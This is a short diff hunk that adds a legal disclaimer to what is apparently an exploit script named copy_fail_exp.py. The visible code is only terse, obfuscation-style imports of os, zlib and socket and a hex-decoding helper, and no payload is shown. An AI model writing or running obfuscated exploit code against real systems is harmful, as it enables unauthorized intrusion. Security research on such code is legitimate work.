@@ -1,3 +1,5 @@
+# You need to understand what you are doing before running `copy_fail_exp.py`. You are solely responsible for the consequences of running this script. Do not run this script on unauthorized computer devices, as this will have unforeseen legal consequences. This code is for educational purposes, technical research, and security testing only; please do not use it for illegal purposes.
+
 #!/usr/bin/env python3
 import os as g,zlib,socket as s
 def d(x):return bytes.fromhex(x)
